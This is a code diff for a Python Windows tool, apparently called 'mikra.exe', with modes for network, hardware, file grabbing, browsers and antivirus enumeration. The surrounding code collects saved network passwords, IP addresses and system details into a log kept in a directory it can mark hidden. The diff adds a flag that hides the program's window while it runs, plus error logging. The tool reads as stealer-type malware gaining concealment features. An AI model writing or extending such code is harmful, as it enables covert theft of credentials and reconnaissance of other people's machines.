@@ -25,6 +25,19 @@ try:
     if __name__ == "__main__":
         if "all" in str(sys.argv) or "network" in str(sys.argv) or "hardware" in str(sys.argv) or "filegraber" in str(
                 sys.argv) or "browsers" in str(sys.argv) or "antisoftware" in str(sys.argv):
+
+            erlist = []
+
+            if "-t" in str(sys.argv):
+                import win32gui
+                import win32.lib.win32con as win32con
+                try:
+                    mainwindow = win32gui.GetForegroundWindow()
+                    win32gui.ShowWindow(mainwindow, win32con.SW_HIDE)
+                except Exception as hdex:
+                    erlist.append("{+} hide window --> " + str(hdex))
+                    print(hdex)
+
             starttime = time.time()
             windll = ctypes.windll.kernel32
             lang = locale.windows_locale[windll.GetUserDefaultUILanguage()]
@@ -62,7 +75,9 @@ try:
                     output = subprocess.check_output(["netsh", "wlan", "show", "interfaces"]).decode(encoding).split(
                         "\n")
                     bssidstr = str(output[9].split()[2])
-                except Exception:
+                except Exception as bsdex:
+                    erlist.append("{+} get_bssid --> " + str(bsdex))
+                    bssidstr = "error"
                     return None
 
 
@@ -132,7 +147,8 @@ try:
                                 print("	   {0}:{1}".format(i, ""))
                             logfile.write("		{0}:{1}\n".format(i, ""))
 
-                except Exception:
+                except Exception as netex:
+                    erlist.append("{+} networkpass --> " + str(netex))
                     pass
 
 
@@ -142,7 +158,7 @@ try:
                     print(" 	 External ip: ", eip)
                     print(" 	 Internal ip: ", iip)
                     print(" 	 Gateway ip: ", gatewayip)
-                    print(" 	 BSSID: %s" % bssidstr)
+                    print(" 	 BSSID: ", bssidstr)
                 logfile.write("""
     {0} Network: 
      External ip: {1}
@@ -197,8 +213,9 @@ try:
      RAM: {3}
      Resolution: {4}""".format(prefix, get_cpu_type(), gpu_name, get_size(svmem.total),
                                str(GetSystemMetrics(0)) + " x " + str(GetSystemMetrics(1))))
-                except Exception as ex:
-                    print(ex)
+                except Exception as hardex:
+                    erlist.append("{+} hardware --> " + str(hardex))
+                    print(hardex)
 
 
             def findall(pattern, path, pok):
@@ -257,8 +274,9 @@ try:
      + {0}""".format(rest))
                             if "-q" not in str(sys.argv):
                                 print(" 	 + " + rest)
-                except Exception as eex:
-                    print(eex)
+                except Exception as lantiex:
+                    erlist.append("{+} listanti --> " + str(lantiex))
+                    print(lantiex)
 
 
             if "all" in str(sys.argv) or "antisoftware" in str(sys.argv):
@@ -558,8 +576,16 @@ try:
             if "-xh" in str(sys.argv):
                 ctypes.windll.kernel32.SetFileAttributesW(dio, 0x02)
 
+            if "-t" in str(sys.argv):
+                try:
+                    win32gui.ShowWindow(mainwindow, win32con.SW_SHOW)
+                except Exception as shex:
+                    erlist.append("{+} show window --> " + str(shex))
+                    print(shex)
+
             totaltime = time.time() - starttime
-            logfile.write("\n    Elapsed time: %s second's\n)" % totaltime)
+            logfile.write(
+                "\n    Elapsed time: {0} second's\n    {1} Error/s: {2}\n)".format(totaltime, len(erlist), erlist))
             logfile.close()
 
             if "-q" not in str(sys.argv):
@@ -575,7 +601,7 @@ try:
 	|___|\__/|___|(__\_|_)(__|  \__)|__|  \___)(___/    \___)
 
 
-Usage: mikra.exe [-h] [-xh] [-q]
+Usage: mikra.exe [-h] [-q] [-t] [-xh] 
 		 {all, network, hardware, filegraber, antisoftware, browsers}
 
 Positional arguments:
@@ -589,6 +615,7 @@ Positional arguments:
 Optional arguments:
  -h		Show help.
  -q		Nothing will be print.
+ -t		Hide main window.
  -xh		Set hidden attribute to mikra dir.""")
 except KeyboardInterrupt:
     sys.exit("\nKeyboardInterrupt")
